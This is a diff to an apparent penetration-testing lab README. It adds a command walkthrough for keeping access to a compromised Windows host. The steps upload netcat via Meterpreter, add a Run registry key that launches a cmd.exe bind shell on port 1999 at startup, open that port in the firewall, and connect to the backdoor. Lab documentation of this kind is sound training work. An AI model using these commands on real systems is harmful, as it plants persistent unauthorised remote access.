@@ -26,11 +26,66 @@ This lab focuses on the critical aspect of penetration testing: retaining access
    - Check the target’s audit settings using auditpol.
    - Manipulate or review event logs to assess the stealthiness of the penetration.
 
-## Tools Used
-   - Kali Linux: The primary operating system used for penetration testing.
-   - Netcat (nc): A simple networking tool used to create a backdoor on the target machine.
-   - Meterpreter: A payload within Metasploit for interacting with a compromised system.
+## Commands and Screenshots
+### Screenshots were taken throughout the process to document access, command execution, and configuration changes.
 
-## Screenshots
-Screenshots were taken throughout the process to document access, command execution, and configuration changes.
 
+#### Meterpreter access on your target host
+
+<img src="https://i.imgur.com/rWefLNQ.png"/>
+
+#### Shell command to list the audit settings.
+```ps
+auditpol /get /category:*
+```
+
+<img src="https://i.imgur.com/iCIwRDe.png"/>
+
+<img src="https://i.imgur.com/6DphOwU.png"/>
+
+#### Command for metepreter shell that will upload the nc.exe program to the target host's windows\system32 directory
+```ps
+upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+```
+
+<img src="https://i.imgur.com/mJyeTK4.png"/>
+
+#### Command set nc to start as a listener on port 1999 by changing the target host's system registry
+```ps
+reg enumkey –k HKLM\\software\\microsoft\\windows\\currentversion\\run
+reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run –v nc –d ‘C:\windows\system32\nc.exe –Ldp 1999 –e cmd.exe’
+```
+#### Command to verify Netcat is set to automatically run on startup
+```ps
+reg queryval –k HKLM\\software\\microsoft\\windows\\currentversion\\Run –v nc
+```
+
+<img src="https://i.imgur.com/AJSSWNn.png"/>
+
+
+#### Command to display target host's firewall settings
+```ps
+netsh firewall show opmode
+```
+
+<img src="https://i.imgur.com/04eLDn6.png"/>
+
+#### Command to set target firewall to open port 1999
+```ps
+netsh firewall add portopening TCP 1999 “Service Firewall” ENABLE ALL
+```
+
+#### Command to verify firewall configuration for open ports
+```ps
+netsh firewall show portopening
+```
+
+<img src="https://i.imgur.com/6Al7h1I.png"/>
+
+
+#### Command to access target host through backdoor at prot 1999
+```ps
+nc –v 10.19.99.110 1999
+```
+
+<img src="https://i.imgur.com/C0uk1OC.png"/>
